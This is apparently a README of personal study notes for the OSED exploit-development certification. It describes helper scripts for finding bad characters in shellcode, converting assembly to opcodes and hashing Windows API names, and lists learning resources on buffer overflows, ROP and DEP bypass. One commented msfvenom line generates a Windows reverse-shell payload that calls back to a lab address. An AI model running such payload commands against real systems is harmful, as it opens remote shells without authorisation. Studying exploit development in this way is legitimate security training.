# OSED_Notes

Here I share tools, scripts and resources that were important during my OSED preparation.

## badchars_find.py
A python script that finds badchars inside generated shellcodes by dividing the shellcode into blocks of \x70 bytes of length


```bash
# msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.1 lport=443 -f python EXITFUNC=thread -v buf

username@host:~$ python3 badchars_find.py
Badchar found: 0x3
Badchar: 0
==============================
Badchar found: 0x4
Badchar: 0
==============================
Badchar found: 0x5
Badchar: 0
==============================
Badchar found: 0x17
Badchar: 40
==============================
...
==============================
Badchar found: 0x55
Badchar: 128
==============================
Badchar found: 0x60
Badchar: 0
==============================
[!] Third block: 22 badchars! [!]
==============================
```

## to_hex.py
A python script that generates the opcodes of the given Assembly instructions

```bash
username@host:~$ python3 to_hex.py
\xcc\x31\xc9\x41\xff\x31\xc3
```

## hash_generator.py
A python script that generates the API Hash used to get the base address of a given function

```bash
username@host:~$ python3 hash_generator.py
Usage: hash_generator.py WINAPI

username@host:~$ python3 hash_generator.py GetProcAddress
GetProcAddress hash: 0x7c0dfcaa
```
# Study Resources

## YouTube
Most Wanted Duck [PT-BR] [Shellcode 0x101](https://www.youtube.com/playlist?list=PL7A__cxMT7zLTwIcdt3ZrnQIGUpIBrTW6) and [Buffer Overflow](https://www.youtube.com/playlist?list=PL7A__cxMT7zIViV15wW0t0kUPrd0QEHLx)

Cyber V1s3r1on's [OSED preparation](https://www.youtube.com/playlist?list=PLqyU-D70UmVOq2GScq6O1HIQNMh5fEBRZ)

Guided Hacking [Binary Exploit Development Course](https://www.youtube.com/playlist?list=PLt9cUwGw6CYEmxx_3z1d-uT9zdEd58yOq)

## GitHub
epi052's [osed-scripts](https://github.com/epi052/osed-scripts)

## Read
[Customizing your WinDbg workspace](https://www.zachburlingame.com/2011/12/customizing-your-windbg-workspace-and-color-scheme/)

Guided Hacking - [Exploit Development](https://guidedhacking.com/threads/exploit-development-vulnserver-simple-buffer-overflow.19989/) and [How to bypass DEP Stack Protection](https://guidedhacking.com/threads/binary-exploit-development-4-how-to-bypass-dep-stack-protection.20109/)

[Corelan - Chaining DEP with ROP](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/#buildingrop)

Connor McGarr's [Rop post](https://connormcgarr.github.io/ROP/)

areyou1or0's [ROP Gadgets: VirtualProtect()](https://areyou1or0.it/index.php/2022/01/24/rop-gadgets-virtualprotect/)

Ionut Popescu's [INTRODUCTION TO WINDOWS SHELLCODE DEVELOPMENT](https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/)
